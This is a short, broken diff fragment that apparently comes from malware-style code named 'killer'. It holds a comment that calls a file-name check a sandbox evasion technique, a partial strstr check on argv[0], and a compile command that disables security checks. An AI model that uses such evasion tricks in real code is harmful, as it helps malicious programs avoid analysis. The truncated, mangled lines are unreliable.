@@ -1,0 +1,3 @@
+	/* Checking the file name is a sandbox evasion technique - if the filename isn't killer.exe
+"	if (strstr(argv[0], ""killer.exe"
+cl.exe /nologo /Ox /MT /W0 /GS- /DNDEBUG /Tp killer.cpp /link /OUT:killer.exe
